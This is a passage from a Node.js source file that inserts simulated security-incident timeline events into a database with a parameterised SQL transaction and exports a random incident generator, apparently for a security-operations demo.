                (incident_id, event_type, event_title, event_description, severity, status, reference_id, event_time)
            VALUES
                ($1, 'alert', 'Alert detected', $2, $3, 'new', $4, CURRENT_TIMESTAMP - INTERVAL '2 minutes'),
                ($1, 'threat_intel', 'Threat intelligence matched', $5, $3, 'open', $4, CURRENT_TIMESTAMP - INTERVAL '1 minute'),
                ($1, 'incident', 'Incident created', $6, $3, 'open', $1, CURRENT_TIMESTAMP),
                ($1, 'response', $7, $8, NULL, 'completed', $1, CURRENT_TIMESTAMP + INTERVAL '10 seconds')
            `,
            [
                incidentId,
                scenario.title,
                scenario.severity,
                alertId,
                `Correlated indicator ${intel.indicatorValue} (${intel.threatName}) with ${intel.confidence}% confidence`,
                scenario.description,
                scenario.responseAction.actionType,
                scenario.responseAction.description
            ]
        );

        await client.query("COMMIT");

        return {
            id: incident.id,
            title: incident.title,
            description: incident.description,
            severity: incident.severity,
            status: incident.status,
            priority: incident.priority,
            alert_id: alertId,
            scenario_id: scenario.id,
            opened_at: incident.opened_at,
            updated_at: incident.updated_at
        };
    } catch (err) {
        await client.query("ROLLBACK");
        console.error("Error generating random incident:", err);
        throw err;
    } finally {
        client.release();
    }
}

module.exports = {
    createRandomSimulatedIncident,
    SCENARIOS
};
